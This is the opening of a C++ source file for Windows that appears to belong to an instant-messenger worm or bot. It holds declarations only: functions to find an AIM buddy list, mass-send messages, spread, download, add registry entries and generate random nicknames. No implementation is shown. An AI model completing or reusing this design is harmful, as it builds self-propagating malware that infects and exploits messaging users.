#define WIN32_LEAN_AND_MEAN
#pragma pack(1)
#pragma comment(linker,"/FILEALIGN:0x200")
#pragma comment(linker,"/NODEFAULTLIB:msvcrt.lib")
#include <windows.h>
#include <winsock2.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <shellapi.h>
#include <string>
using namespace std;
using std::string;
HWND FindBuddyList();
void SendIM(HWND imWindow, LPCTSTR message);
void IMAllWindows(LPCTSTR message);
void IMAll(HWND buddyList, LPCTSTR message);
DWORD WINAPI AIMSpread (void *pVoid);
DWORD WINAPI dwl(void *pVoid);
void uninstall(void);
void rndnick();
int parse(char *line);
DWORD WINAPI regadd(void *pVoid);
struct cAim_t
{
	BOOL x;
};
struct link_t
{
	std::string link;
};
